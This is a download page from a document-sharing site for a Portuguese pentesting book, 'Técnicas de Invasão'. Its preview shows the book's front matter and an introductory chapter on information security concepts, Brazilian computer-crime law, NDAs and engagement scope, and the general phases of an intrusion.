<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
<title>Livro-Tecnicas-De-Invasao.pdf - PDFCOFFEE.COM</title>
<meta name="description" content="Descri&ccedil;&atilde;o completa...">
<link rel="canonical" href="https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html" />
<meta property="og:url" content="https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html" />
<meta property="og:title" content="Livro-Tecnicas-De-Invasao.pdf - PDFCOFFEE.COM" />
<meta property="og:description" content="Descri&ccedil;&atilde;o completa..." />
<meta property="og:image" content="https://pdfcoffee.com/img/livro-tecnicas-de-invasaopdf-pdf-free.jpg" />
<meta property="og:site_name" content="pdfcoffee.com" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@pdfcoffee.com" />
<meta name="twitter:title" content="Livro-Tecnicas-De-Invasao.pdf - PDFCOFFEE.COM" />
<meta name="twitter:description" content="Descri&ccedil;&atilde;o completa..." />
<meta name="twitter:image" content="https://pdfcoffee.com/img/livro-tecnicas-de-invasaopdf-pdf-free.jpg" />
<meta name="format-detection" content="telephone=no">
<meta name="application-name" content="pdfcoffee.com" />
<meta name="apple-mobile-web-app-status-bar-style" content="white" />
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="mobile-web-app-capable" content="yes" />
<link rel="apple-touch-icon" sizes="57x57" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://pdfcoffee.com/pdfcoffee/assets/img/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="https://pdfcoffee.com/pdfcoffee/assets/img/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://pdfcoffee.com/pdfcoffee/assets/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="https://pdfcoffee.com/pdfcoffee/assets/img/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://pdfcoffee.com/pdfcoffee/assets/img/favicon-16x16.png">
<link rel="manifest" href="https://pdfcoffee.com/pdfcoffee/assets/img/manifest.json">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="https://pdfcoffee.com/pdfcoffee/assets/img/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<link href="https://fonts.googleapis.com/css?family=Montserrat:400,400i,500,500i,600,600i,700,700i&display=swap&subset=cyrillic,cyrillic-ext,latin-ext,vietnamese" rel="stylesheet">
<link href='https://pdfcoffee.com/pdfcoffee/assets/bootstrap.min.css' rel='stylesheet' type='text/css'>
<link href='https://pdfcoffee.com/pdfcoffee/assets/css/bootstrap-social.css' rel='stylesheet' type='text/css'>
<link href='https://pdfcoffee.com/pdfcoffee/assets/font-awesome/css/font-awesome.min.css' rel='stylesheet' type='text/css'>
<link href='https://pdfcoffee.com/pdfcoffee/assets/min.css?v=2.3' rel='stylesheet' type='text/css'>
<script src="https://pdfcoffee.com/pdfcoffee/assets/popper.min.js"></script>
<script src="https://pdfcoffee.com/pdfcoffee/assets/js/jquery-3.2.1.min.js"></script>
<script src="https://pdfcoffee.com/pdfcoffee/assets/bootstrap.min.js"></script>
<style>
	    .mh-logo {
		max-height: 32px;
	    }
	    .dropdown-menu.show {
		display: inline-table !important;
	    }
	</style>
<script type="application/ld+json">
            {
		"@context": "http://schema.org",
		"@type": "NewsArticle",
		"mainEntityOfPage": {
		    "@type": "WebPage",
		    "@id": "https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html"
		},
		"headline": "Livro-Tecnicas-De-Invasao.pdf - PDFCOFFEE.COM",
		"description": "Descri&ccedil;&atilde;o completa...",
		"datePublished": "2019-07-30-0421:31:06+00:00",
		"dateModified": "2019-09-29-0419:49:58+00:00",
		"author": {
		    "@type": "Person",
		    "name": "Guest"		},
		"publisher": {
		    "@type": "Organization",
		    "name": "PDFCOFFEE.COM",
		    "logo": {
			"@type": "ImageObject",
			"url": "https://pdfcoffee.com/pdfcoffee/assets/img/pdfcoffee_logo.png",
			"width": 60,
			"height": 60
		    }
		},
		"image": {
		    "@type": "ImageObject",
		    "url": "https://pdfcoffee.com/img/livro-tecnicas-de-invasaopdf-pdf-free.jpg",
		    "width": 300,
		    "height": 300
		}
            }
        </script>
</head>
<body>

<header id="header" class="container-fluid p-0">
<div id="top-bar">
<div class="container">
<div class="row">
<div class="col-12">
<ul id="top-info">
<li>Email: <a href="/cdn-cgi/l/email-protection#8be2e5ede4cbfbefede8e4ededeeeea5e8e4e6"><span class="__cf_email__" data-cfemail="7811161e1738081c1e1b171e1e1d1d561b1715">[email&#160;protected]</span></a></li>
</ul>
<ul id="top-buttons">
<li><a href="https://pdfcoffee.com/login"><i class="fa fa-sign-in"></i> Login</a></li>
<li><a href="https://pdfcoffee.com/register"><i class="fa fa-pencil-square-o"></i> Register</a></li>
<li class="divider"></li>
<li>
<div class="language-switcher dropdown">
<span class="dropdown-toggle" id="dropdownlang" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="fa fa-globe"></i> English</span>
<ul class="dropdown-menu p-0" aria-labelledby="dropdownlang">
<li class="dropdown-item small"><a href="#Deutsch">Deutsch</a></li>
<li class="dropdown-item small"><a href="#Español">Español</a></li>
<li class="dropdown-item small"><a href="#Français">Français</a></li>
<li class="dropdown-item small"><a href="#Português">Português</a></li>
</ul>
</div>
</li>
</ul>
</div>
</div>
</div>
</div>
<nav class="navbar navbar-expand-md px-1 m-0 bg-dark">
<div class="container-fluid">
<a class="navbar-brand mx-0" href="https://pdfcoffee.com/">
<img src="https://pdfcoffee.com/pdfcoffee/assets/img/pdfcoffee_logo.png" class="mh-logo" alt="pdfcoffee.com" />
</a>
<button class="navbar-toggler px-1" type="button" data-toggle="collapse" data-target="#navbarContent" aria-controls="navigation-index" aria-expanded="false">
<i class="fa fa-list-alt text-white"></i>
</button>
<div class="collapse navbar-collapse text-right justify-content-center small" id="navbarContent">
<ul class="navbar-nav">
<li class="nav-item px-2">
<a class="nav-link text-white" href="https://pdfcoffee.com/">
<i class="fa fa-home mr-1"></i> Home </a>
</li>
<li class="nav-item px-2 dropdown">
<a class="nav-link text-white dropdown-toggle" id="dropdowncategories" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" href="#Categories">
<i class="fa fa-list-alt mr-1"></i> Top Categories
</a>
<ul class="dropdown-menu p-0" aria-labelledby="dropdowncategories">
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/career-money">CAREER & MONEY</a>
</li>
 <li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/personal-growth">PERSONAL GROWTH</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/politics-current-affairs">POLITICS & CURRENT AFFAIRS</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/science-tech">SCIENCE & TECH</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/health-fitness">HEALTH & FITNESS</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/lifestyle">LIFESTYLE</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/entertainment">ENTERTAINMENT</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/biographies-history">BIOGRAPHIES & HISTORY</a>
</li>
<li class="dropdown-item small">
<a href="https://pdfcoffee.com/category/fiction">FICTION</a>
</li>
</ul>
</li>
<li class="nav-item px-2">
<a class="nav-link text-white" href="https://pdfcoffee.com/top-stories">
<i class="fa fa-paper-plane mr-1"></i> Top stories
</a>
</li>
<li class="nav-item px-2">
<a class="nav-link text-white" href="https://pdfcoffee.com/best-stories">
<i class="fa fa-paper-plane-o mr-1"></i> Best stories
</a>
</li>
<li class="nav-item px-2">
<a class="nav-link text-white" href="https://pdfcoffee.com/publish">
<i class="fa fa-plus mr-1"></i> Add Story </a>
</li>
<li class="nav-item px-2">
<a class="nav-link text-white" href="https://pdfcoffee.com/documents">
<i class="fa fa-file mr-1"></i> My Stories </a>
</li>
</ul>
</div>
</div>
</nav>
</header>

<div class="container-fluid">
<div class="row">
<div class="col-12 my-2">
<nav aria-label="breadcrumb">
<ol class="breadcrumb">
<li class="breadcrumb-item"><a href="https://pdfcoffee.com/"><small>Home</small></a></li>
<li class="breadcrumb-item active" aria-current="page"><small>Livro-Tecnicas-De-Invasao.pdf</small></li>
</ol>
</nav>
</div>
</div>
</div>
<div class="container-fluid">
<div class="row my-3">
<div class="col-lg-2 col-md-2 col-12 mb-3">
<h1><small>Livro-Tecnicas-De-Invasao.pdf</small></h1>
<p class="ecover d-none d-md-inline-block my-3"><img class="w-100" src="https://pdfcoffee.com/img/200x200/livro-tecnicas-de-invasaopdf-pdf-free.jpg" alt="Livro-Tecnicas-De-Invasao.pdf" /></p>
<ul class="list-group my-3">
<li class="list-group-item small"><i class="fa fa-user-secret mr-1"></i>Author / Uploaded</li>
<li class="list-group-item small">
<a href="#adilson+junior">adilson junior</a>
</li>
</ul>
<ul class="list-group">
<li class="list-group-item small"><i class="fa fa-list-alt mr-1"></i>Categories</li>
<li class="list-group-item small">
<a href="https://pdfcoffee.com/category/protocolo-de-controle-de-transmissao?t=Protocolo+de+Controle+de+Transmiss%C3%A3o">Protocolo de Controle de Transmissão</a>
</li>
<li class="list-group-item small">
<a href="https://pdfcoffee.com/category/modelo-osi?t=Modelo+OSI">Modelo OSI</a>
</li>
<li class="list-group-item small">
<a href="https://pdfcoffee.com/category/rede-de-computadores?t=Rede+de+Computadores">Rede de Computadores</a>
</li>
<li class="list-group-item small">
<a href="https://pdfcoffee.com/category/transmissao-de-dados?t=Transmiss%C3%A3o+de+Dados">Transmissão de Dados</a>
</li>
<li class="list-group-item small">
<a href="https://pdfcoffee.com/category/redes-de-computadores?t=Redes+de+Computadores">Redes de Computadores</a>
</li>
</ul>
 <p class="my-3">

<a href="https://www.facebook.com/sharer.php?u=https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html" target="_blank" class="btn btn-social-icon btn-facebook">
<i class="fa fa-facebook"></i>
</a>

<a href="https://twitter.com/intent/tweet?url=https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html" target="_blank" class="btn btn-social-icon btn-twitter">
<i class="fa fa-twitter"></i>
</a>
</p>
<div class="fb-like" data-href="https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html" data-layout="button_count" data-action="like" data-size="large" data-show-faces="false" data-share="false"></div>
<div id="fb-root"></div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
		(function (d, s, id) {
		    var js, fjs = d.getElementsByTagName(s)[0];
		    if (d.getElementById(id))
			return;
		    js = d.createElement(s);
		    js.id = id;
		    js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v2.9&appId=2207750209524217";
		    fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));
	    </script>
<div class="fb-comments" data-href="https://pdfcoffee.com/livro-tecnicas-de-invasaopdf-pdf-free.html" data-width="100%" data-numposts="5"></div>
</div>
<div class="col-lg-5 col-md-5 col-12">
<p><small>Descrição completa</small></p>
<p class="d-block small">
<span class="mr-3 my-1 d-block d-md-inline-block"><em><i class="fa fa-eye"></i> Views 4,365</em></span>
<span class="mr-3 my-1 d-block d-md-inline-block"><em><i class="fa fa-download"></i> Downloads 891</em></span>
<span class="mr-3 my-1 d-block d-md-inline-block"><em><i class="fa fa-file-o"></i> File size 9MB</em></span>
</p>
<p class="d-block small">
<a href="#" data-toggle="modal" data-target="#report" class="text-danger"><em><i class="fa fa-flag-checkered"></i> Report DMCA / Copyright</em></a>
</p>
<p>
<a href="https://pdfcoffee.com/download/livro-tecnicas-de-invasaopdf-pdf-free.html" class="btn btn-success btn-block"><i class="fa fa-file-pdf-o"></i> DOWNLOAD FILE</a>
</p
	    	    		<p>
<iframe id="pdfviewer" src="https://pdfcoffee.com/pdfviewer/web/viewer.html?file=https%3A%2F%2Fpdfcoffee.com%2Fpdfcoffee%2Fassets%2Fpdf%2Fmin.pdf#zoom=page-fit" width="100%" height="360" class="d-none d-md-block d-lg-block w-100"></iframe>
</p>
</div>
<div class="col-lg-5 col-md-5 col-12">
<h5><strong>Citation preview</strong></h5>
<hr />
<p class="d-block text-justify">Este livro é uma obra pessoal baseada na licença copyleft, você pode distribuir cópias gratuitamente, sendo que os mesmos direitos sejam preservados em trabalhos derivados criados posteriormente. Compilador: LinkedIn: website: Revisora:<br /> <br /> Thompson Vangller linkedin.com/in/vangller cybersewer.com Beatriz Amoedo Giorgi<br /> <br /> Vangller, Thompson. V253t Técnicas de invasão / Thompson Vangller. – Londres: 2017. 548 p. : il. 1. Hacking. 2. Técnicas de invasão – segurança da informação. I. Título. CDU: 004<br /> <br /> © Copyleft Author<br /> <br /> 2<br /> <br /> fsociety00.dat<br /> <br /> 3<br /> <br /> Hello, friend<br /> <br /> À minha filha, Alice, que me deu todo o impulso para chegar até aqui. Aos meus pais, que me criaram com carinho e amor. À minha esposa, Beatriz, por sempre me apoiar e perder várias noites de sono comigo. Ao Elton, por compartilhar o seu conhecimento, e ao Bruno Fraga por ter aparecido em minha vida como um coelho branco que eu decidi seguir. 4<br /> <br /> PROFISSIONAIS ENVOLVIDOS<br /> <br /> Growth Hacker, professor e idealizador do projeto Técnicas de Invasão, que ensina pessoas sobre Segurança da Informação e proteção de dados, projeto que em suas últimas edições alcançou mais de 4 milhões de pessoas na internet. Bruno Fraga<br /> <br /> Profissional de TI, hacker entusiasta e criador desta obra. Graduado em Tecnologia de Redes de Computadores e pós graduando em Cybersecurity. Certificado em MTA 98-365, MTA 98-366, VTSP e ISO 27001. Thompson Vangller<br /> <br /> 5<br /> <br /> COMENTÁRIOS DO COMPILADOR<br /> <br /> Construí esta obra a partir das videoaulas do curso online Técnicas de Invasão e pesquisas realizadas na internet. As informações coletadas de fontes externas foram modificadas para melhor entendimento do leitor. A citação da fonte de origem pode ser encontrada no final de cada tópico. O propósito desta obra é o de servir como um guia à introdução de pentest, podendo ser utilizado também como um manual de consulta para realizar ataques clássicos. O que realmente espero é que o leitor entenda a essência dos acontecimentos e o modo como o atacante pensa, pois as metodologias e ferramentas utilizadas podem mudar com o tempo, já que, todos os dias, novas atualizações de segurança surgem e novas vulnerabilidades são descobertas. SOBRE O TÉCNICAS DE INVASÃO – LEVEL 01<br /> <br /> O Técnicas de Invasão é um projeto idealizado por Bruno Fraga. O objetivo do projeto é o de conscientizar sobre os riscos e ameaças existentes no mundo virtual e oferecer cursos altamente desenvolvidos para introdução de testes de invasão. Apresenta, de modo inteligente e organizado, todo o processo de uma invasão, desde o princípio, e 6<br /> <br /> ensina passo a passo as metodologias e técnicas clássicas utilizadas por hackers. Além disso, busca alertar o aluno sobre riscos, apresentando dicas de proteção e pensamentos de hackers maliciosos. O QUE ESTE LIVRO CONTÉM?<br /> <br /> Este livro cobre as metodologias e técnicas clássicas, utilizadas por hackers, utilizando ferramentas do Kali Linux e outras ferramentas disponíveis na web, como o Shodan, Censys, Google Hacking, entre outros. QUEM DEVE LER ESTE LIVRO?<br /> <br /> Este livro é destinado a profissionais de Segurança da Informação, administradores de sistemas, engenheiros de software, profissionais de TI que buscam o conhecimento em técnicas de invasão, curiosos e pessoas que desejam iniciar uma carreira em TI. O QUE É NECESSÁRIO PARA REALIZAR OS TESTES?<br /> <br /> Para aprender de maneira eficiente todo o conhecimento que o livro apresenta e realizar os testes, é necessário: ! Uma máquina virtual/física com o SO Kali Linux; 7<br /> <br /> ! Uma máquina virtual/física com o SO Windows; ! Uma máquina virtual/física com o SO Metasploitable; ! Acesso à Internet. É recomendado, também, que você tenha conhecimento básico de comandos Linux.<br /> <br /> 8<br /> <br /> Morpheus: At last. Welcome, Neo. As you no doubt have guessed I am Morpheus. Neo: It's an honor to meet you. Morpheus: No, the honor is mine. Please, come. Sit. I imagine that right now you are feeling a bit like Alice. Tumbling down the rabbit hole? Hmm? Neo: You could say that. Morpheus: I can see it in your eyes. You have the look of a man who accepts what he sees because he's expecting to wake up. Ironically, this is not far from the truth. Do you believe in fate, Neo? Neo: No. Morpheus: Why not? Neo: Because I don't like the idea that I'm not in control of my life. Morpheus: I know exactly what you mean. Let me tell you why you're here. You're here because you know something. What you know you can't explain, but you feel it. You've felt it your entire life. That there's something wrong with the world, you don't know what it is, but it's there. Like a splinter in your mind, driving you mad. It is this feeling that has brought you to me. Do you know what I'm talking about? Neo: The Matrix? Morpheus: Do you want to know what it is? Morpheus: The Matrix is everywhere. It is all around us. Even now, in this very room. You can see it when you look out your window or when you turn on your television. You can feel it when you go to work, when you go to church, when you pay your taxes. It is the world that has been pulled over your eyes to blind you from the truth. Neo: What truth? Morpheus: That you are a slave, Neo. Like everyone else you were born into bondage. Born into a prison that you cannot smell or taste or touch. A prison for your mind. Unfortunately, no one can be told what the Matrix is. You have to see it for yourself. This is your last chance. After this, there is no turning back. [opens hand, unveiling blue pill] You take the blue pill, the story ends, you wake up in your bed and believe whatever you want to believe. [opens hand, unveiling red pill] You take the red pill, you stay in Wonderland, and I show you how deep the rabbit hole goes. [Speaks before Neo takes the Red Pill] Morpheus:Remember: all I'm offering is the truth. Nothing more. Morpheus: Follow me. The Matrix - Tumbling down the rabbit hole<br /> <br /> 9<br /> <br /> CHAPTER 01<br /> <br /> 10<br /> <br /> 1. SEGURANÇA DA INFORMAÇÃO<br /> <br /> UNIDADE 01<br /> <br /> Segurança da informação está relacionada à proteção de um conjunto de dados, no sentido de preservar o valor que estes dados possuem para um indivíduo ou uma organização. São características básicas da segurança da informação os atributos de confidencialidade, integridade e disponibilidade, não estando esta segurança restrita somente a sistemas computacionais, informações eletrônicas ou sistemas de armazenamento. O conceito se aplica a todos os aspectos de proteção de informações e dados. O conceito de segurança de computadores está intimamente relacionado ao de segurança da informação, incluindo não apenas a segurança dos dados/informação, mas também a dos sistemas em si. Atualmente, o conceito de segurança da informação está padronizado pela norma ISO/IEC 17799:2005, influenciada pelo padrão inglês (British Standard) BS 7799. A série de normas ISO/IEC 27000 foi reservada para tratar de padrões de segurança da informação, incluindo a complementação ao trabalho original do padrão inglês. A ISO/IEC 27002:2005 continua sendo considerada formalmente como 17799:2005 para fins históricos.<br /> <br /> 1.<br /> <br /> Conceitos<br /> <br /> A Segurança da Informação se refere à proteção existente sobre as informações de uma determinada empresa ou pessoa, isto é, aplica-se tanto às 11<br /> <br /> informações corporativas quanto às pessoais. Entendese por informação todo e qualquer conteúdo ou dado que tenha valor para alguma organização ou pessoa. Ela pode estar guardada para uso restrito ou exposta ao público para consulta ou aquisição. Podem ser estabelecidas métricas (com o uso ou não de ferramentas) para a definição do nível de segurança existente e, com isso, serem estabelecidas as bases para análise da melhoria ou piora da situação de segurança existente. A segurança de uma determinada informação pode ser afetada por fatores comportamentais e de uso de quem a utiliza, pelo ambiente ou infraestrutura que a cerca, ou por pessoas mal intencionadas que têm o objetivo de furtar, destruir ou modificar tal informação. A tríade CIA (Confidentiality, Integrity and Availability) - Confidencialidade, Integridade e Disponibilidade -representa os principais atributos que, atualmente, orientam a análise, o planejamento e a implementação da segurança para um determinado grupo de informações que se deseja proteger. Outros atributos importantes são a irretratabilidade e a autenticidade. Com o evoluir do comércio eletrônico e da sociedade da informação, a privacidade também se tornou uma grande preocupação. Os atributos básicos (segundo os padrões internacionais) são os seguintes: 12<br /> <br /> Confidencialidade: Propriedade que limita o acesso à informação tão somente às entidades legítimas, ou seja, àquelas autorizadas pelo proprietário da informação. Integridade: Propriedade que garante que a informação manipulada m a n t e n h a t o d a s a s c a ra c t e r í s t i c a s o r i g i n a i s estabelecidas pelo proprietário da informação, incluindo controle de mudanças e garantia do seu ciclo de vida (nascimento, manutenção e destruição). Disponibilidade: Propriedade que garante que a informação esteja sempre disponível para o uso legítimo, ou seja, por aqueles usuários autorizados pelo proprietário da informação. O nível de segurança desejado pode se consubstanciar em uma "política de segurança" que é seguida pela organização ou pessoa, para garantir que uma vez estabelecidos os princípios, aquele nível desejado seja perseguido e mantido. Para a montagem desta política, deve-se levar em conta:<br /> <br /> ! Riscos associados à falta de segurança; 13<br /> <br /> ! Benefícios; ! Custos de implementação dos mecanismos. Mecanismos de segurança: O suporte para as recomendações de segurança pode ser encontrado em: Controles físicos: São barreiras que limitam o contato ou acesso direto à informação ou à infraestrutura (que garante a existência da informação) que a suporta. Existem mecanismos de segurança que apoiam os controles físicos: Portas, trancas, paredes, blindagem, guardas etc. Controles lógicos: São barreiras que impedem ou limitam o acesso à informação que está em ambiente controlado, geralmente eletrônico, e que, de outro modo, ficaria exposta à alteração não autorizada por elemento malintencionado. Existem mecanismos de segurança que apoiam os controles lógicos, são eles: Mecanismos de criptografia: Permitem a transformação reversível da informação de forma a torná-la ininteligível a terceiros. Utiliza-se 14<br /> <br /> para isso algoritmos determinados e uma chave secreta para, a partir de um conjunto de dados não criptografados, produzir uma sequência de dados criptografados. A operação inversa é a decifração. Assinatura digital: Um conjunto de dados criptografados, associados a um documento do qual são função, garantindo a integridade do documento associado, mas não a sua confidencialidade. Mecanismos de garantia da integridade da informação: Usando funções de "Hashing" ou de checagem, consistindo na adição. Mecanismos de controle de acesso: Palavras-chave, sistemas biométricos, firewalls e cartões inteligentes. Mecanismos de certificação: Atesta a validade de um documento. Integridade: Medida em que um serviço/informação é genuíno, isto é, está protegido(a) contra a personificação por intrusos. Honeypot: 15<br /> <br /> É o nome dado a um software cuja função é a de detectar ou de impedir a ação de um cracker, de um spammer, ou de qualquer agente externo estranho ao sistema, enganando-o, fazendo-o pensar que esteja de fato explorando uma vulnerabilidade daquele sistema. Existe hoje em dia um elevado número de ferramentas e sistemas que pretendem fornecer segurança. Alguns exemplos são os detectores de intrusões, os antivírus, firewalls, filtros AntiSpam, fuzzers, analisadores de código etc.<br /> <br /> Ameaças à segurança: As ameaças à segurança da informação são relacionadas diretamente à perda de uma de suas três características principais: Perda de Confidencialidade: Ocorre quando há uma quebra de sigilo de uma determinada informação (exemplo: a senha de um usuário ou administrador de sistema), permitindo que sejam expostas informações restritas as quais seriam acessíveis apenas por um determinado grupo de usuários. Perda de Integridade: 16<br /> <br /> Acontece quando uma determinada informação fica exposta a manuseio por uma pessoa não autorizada, que efetua alterações que não foram aprovadas e não estão sob o controle do proprietário (corporativo ou privado) da informação.<br /> <br /> Perda de Disponibilidade: Ocorre quando a informação deixa de estar acessível por quem necessita dela. Seria o caso da perda de comunicação com um sistema importante para a empresa, que aconteceu com a queda de um servidor ou de uma aplicação crítica de negócio, que apresentou uma falha devido a um erro causado por motivo interno ou externo ao equipamento ou por ação não autorizada de pessoas com ou sem má intenção. Fonte: https://pt.wikipedia.org/wiki/Segurança_da_informação<br /> <br /> 2.<br /> <br /> Aspectos Legais<br /> <br /> A segurança da informação é regida por alguns padrões internacionais que são sugeridos e devem ser seguidos por corporações que desejam aplicá-la em suas atividades diárias. Algumas delas são as normas da família ISO 27000, que rege a segurança da informação em aspectos gerais, tendo como as normas mais conhecidas as ISO 27001, que realiza a gestão da segurança da informação com relação à empresa, e a ISO 27002, 17<br /> <br /> que efetiva a gestão da informação com relação aos profissionais, que podem realizar implementações importantes as quais podem fazer com que uma empresa cresça no aspecto da segurança da informação. Existem diversas normas ISOs. Você pode conhecê-las no site The ISO 27000 Directory. http://www.27000.org/ Fonte: Videoaula TDI – Concepção – Aspectos Legais<br /> <br /> Segurança da Informação no Brasil Direito Digital: “É o resultado da relação entre a ciência do Direito e a ciência da Computação, sempre empregando novas tecnologias. Trata-se do conjunto de normas, aplicações, conhecimentos e relações jurídicas, oriundas do universo digital. Como consequência desta interação e da comunicação ocorrida em meio virtual, surge a necessidade de se garantir a validade jurídica das informações prestadas, bem como transações, através do uso de certificados digitais.” Marcelo de Camilo Tavares Alves<br /> <br /> No Brasil, existem algumas leis que se aplicam ao direito digital, como: Lei 12.737/2012, conhecida como Lei Carolina Dieckmann, tipifica os crimes cibernéticos. *Fonte: Videoaula TDI – Concepção – Aspectos Legais<br /> <br /> 18<br /> <br /> Art. 154-A: Invadir dispositivo informático alheio, conectado ou não à rede de computadores, mediante violação indevida de mecanismo de segurança e com o fim de obter, adulterar ou destruir dados ou informações sem autorização expressa ou tácita do titular do dispositivo ou instalar vulnerabilidades para obter vantagem ilícita: Pena – detenção, de 3 (três) meses a 1 (um) ano, e multa. Esta lei é fruto de um casuísmo em que o inquérito policial, relativo à suposta invasão do computador da atriz Carolina Dieckmann, sequer foi concluído e nenhuma ação penal intentada (porém os acusados foram mais do que pré-julgados). A lei passa, então, a punir determinados delitos, como a “invasão de d i s p o s i t i v o s i n f o r m á t i c o s ”, a s s i m d i s p o n d o especificamente o Art. 154-A. Deve-se esclarecer que a invasão, para ser criminosa, deve se dar sem a autorização expressa ou tácita do titular dos dados ou do dispositivo. Logo, o agente que realiza teste de intrusão (pentest), não pode ser punido, por não estarem reunidos os elementos do crime. Caberá, no entanto, às empresas de segurança e auditoria adaptarem seus contratos de serviços e pesquisa neste sentido, prevendo expressamente a exclusão de eventual incidência criminosa nas atividades desenvolvidas. 19<br /> <br /> Fonte: http://idgnow.com.br/blog/plural/2013/04/02/lei-carolinadieckman-pontos-mal-explicados-podem-dar-margem-a-interpretacoesequivocadas/<br /> <br /> Observação: (01) Cuidado com as aplicações dos conhecimentos ensinados neste livro, pois o uso de muitas ferramentas, técnicas e metodologias ensinados aqui podem levar à prisão do indivíduo que as executou. Realize os testes em um ambiente em que você seja o responsável e tenha controle, por exemplo, utilizando máquinas virtuais, rede LAN, seu IP público e domínio. Na criação deste livro, o uso dessas ferramentas não infringiu nenhuma lei.<br /> <br /> 3.<br /> <br /> Acordo de confidencialidade - NDA<br /> <br /> Um contrato NDA, Non Disclosure Agreement, é um acordo em que as partes que o assinam concordam em manter determinadas informações confidenciais. Para evitar que algum dos envolvidos ou mesmo terceiros tenham acesso a essas informações e as utilizem indevidamente, é possível firmar um NDA. A principal vantagem de um NDA é a de diminuir as chances de que dados críticos a uma organização ou projeto sejam divulgados, já que um NDA define penalidades para quem descumpre as cláusulas de confidencialidade. 20<br /> <br /> Além disso, um NDA facilita o “caminho jurídico” a ser tomado caso ocorra o vazamento de informações confidenciais, economizando tempo e recursos para a sua organização e aumentando as possibilidades de ganhar causas por quebra de sigilo. A ISO 27002 define algumas normas para serem seguidas quanto ao código de prática para a Gestão da Segurança da Informação, veja: Para implementar a SI em uma organização, é necessário que seja estabelecida uma estrutura para gerenciá-la. Para isso, as atividades de segurança da informação devem ser coordenadas por representantes de diversas partes da organização, com funções e papéis relevantes. Todas as responsabilidades pela segurança da informação também devem estar claramente definidas. É importante, ainda, que sejam estabelecidos acordos de confidencialidade para proteger as informações de caráter sigiloso, bem como as informações que são acessadas, comunicadas, processadas ou gerenciadas por partes externas, tais como terceiros e clientes. Estrutura de um acordo NDA É de extrema importância para um analista pentest assinar um NDA, com detalhes das condições que a empresa irá disponibilizar e informações que esse analista tomará conhecimento.<br /> <br /> 21<br /> <br /> Escopo: Ele define o que será testado durante o processo de intrusão, quando e por quanto será realizado. É importante esta definição para que ambas as partes não sejam prejudicadas. Essa importância se dá, por exemplo, pois, durante um teste em períodos de pico de uma empresa, a indisponibilidade de um sistema pode causar danos financeiros à empresa.<br /> <br /> Limites: A definição de limites é uma etapa crucial, pois um ataque pode causar danos em sistemas e 22<br /> <br /> equipamentos que podem ser irreversíveis, causando um grande prejuízo financeiro para a empresa. Plano de comunicação: Define quem irá receber as informações encontradas e como elas serão disponibilizadas. Essa etapa requer muita atenção devido à possibilidade de as informações que um pentest pode encontrar serem altamente sensíveis. Fonte: Videoaula TDI – Concepção – Acordo de confidencialidade<br /> <br /> 4.<br /> <br /> Fases do Processo de Técnicas de Invasão<br /> <br /> As fases de um processo de invasão são basicamente divididas em três etapas, são elas: Conhecer: Resume-se em coletar informações do alvo que será invadido, através dos mais diversos meios. Como coletar endereços de e-mails, pessoas que se conectam ao alvo, rastrear usuários, explorar o Google Hacking, entre outros.<br /> <br /> Analisar: A partir dos dados coletados na etapa anterior, iremos analisar cada dado para extrair o máximo de 23<br /> <br /> informação do alvo. Esta é a principal etapa para uma invasão bem-sucedida, a qual inclui, por exemplo, a realização de varredura de IP, serviços, SO, versões de serviços, entre outros. Explorar: Esta etapa se resume em explorar todas as informações que foram analisadas para ganhar acesso ao alvo, como utilizar exploits, realizar ataques para quebras de senhas, engenharia social, entre outros. Fonte: Videoaula TDI – Concepção – Fases do Processo de Técnicas de Invasão<br /> <br /> 5.<br /> <br /> Ética e Código de Conduta<br /> <br /> A ética é impulsionada pelas expectativas da indústria de segurança da informação sobre como os profissionais de segurança se comportam durante 